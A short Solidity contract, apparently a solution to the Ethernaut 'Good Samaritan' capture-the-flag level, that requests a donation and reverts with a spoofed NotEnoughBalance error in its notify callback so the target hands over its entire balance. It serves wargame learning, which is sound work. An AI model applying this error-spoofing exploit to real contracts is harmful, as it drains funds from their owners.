// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0 <0.9.0;

import "@openzeppelin/contracts/utils/Address.sol";
import { GoodSamaritan, Coin, Wallet} from "./GoodSamaritan.sol";


interface INotifyable {
    function notify(uint256 amount) external;
}


contract GudSama {
    GoodSamaritan goodSamaritan;
    Coin coin;
    Wallet wallet;

    error NotEnoughBalance();

    constructor(GoodSamaritan _goodSamaritan, Coin _coin, Wallet _wallet){
        goodSamaritan = _goodSamaritan;
        coin = _coin;
        wallet = _wallet;  
    }


    function robTheSama() public {
        goodSamaritan.requestDonation();
    }

    function notify(uint256 amount) external{
        if(amount == 10){
            revert NotEnoughBalance();
        }
    }
}